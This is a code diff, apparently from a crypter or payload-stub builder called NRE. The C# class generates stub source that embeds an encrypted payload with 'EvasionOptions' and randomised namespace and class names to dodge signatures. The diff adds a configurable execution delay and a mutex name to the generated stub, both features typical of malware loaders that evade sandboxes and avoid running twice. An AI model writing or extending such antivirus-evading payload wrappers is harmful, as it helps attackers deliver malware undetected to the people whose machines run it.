@@ -19,7 +19,9 @@ public static class ResourceEmbedder
         byte[] iv,
         PayloadType payloadType,
         CompressionFormat compressionFormat,
-        EvasionOptions evasion)
+        EvasionOptions evasion,
+        int delaySeconds = 0,
+        string mutexName = null)
     {
         string nsSuffix = "E" + Rng.Next(0x10000000, int.MaxValue).ToString("X8");
         string dataClass = "C" + Rng.Next(0x1000, 0x10000).ToString("X4");
@@ -43,6 +45,8 @@ public static class ResourceEmbedder
         sb.AppendLine("    public static NRE.Core.Common.PayloadType PayloadType { get; } = (NRE.Core.Common.PayloadType)" + (byte)payloadType + ";");
         sb.AppendLine("    public static NRE.Core.Common.CompressionFormat CompressionFormat { get; } = (NRE.Core.Common.CompressionFormat)" + (byte)compressionFormat + ";");
         sb.AppendLine("    public static NRE.Core.Evasion.EvasionOptions Evasion { get; } = (NRE.Core.Evasion.EvasionOptions)" + (uint)evasion + "u;");
+        sb.AppendLine("    public static int DelaySeconds { get; } = " + Math.Max(0, delaySeconds) + ";");
+        sb.AppendLine("    public static string MutexName { get; } = \"" + (mutexName ?? "").Replace("\\", "\\\\").Replace("\"", "\\\"") + "\";");
         sb.AppendLine("}");
         sb.AppendLine("}");
         sb.AppendLine("namespace NRE.Stub.Embedded");
@@ -55,6 +59,8 @@ public static class ResourceEmbedder
         sb.AppendLine("    public static NRE.Core.Common.PayloadType PayloadType => " + fullDataClass + ".PayloadType;");
         sb.AppendLine("    public static NRE.Core.Common.CompressionFormat CompressionFormat => " + fullDataClass + ".CompressionFormat;");
         sb.AppendLine("    public static NRE.Core.Evasion.EvasionOptions Evasion => " + fullDataClass + ".Evasion;");
+        sb.AppendLine("    public static int DelaySeconds => " + fullDataClass + ".DelaySeconds;");
+        sb.AppendLine("    public static string MutexName => " + fullDataClass + ".MutexName;");
         sb.AppendLine("}");
         sb.AppendLine("}");
         return sb.ToString();
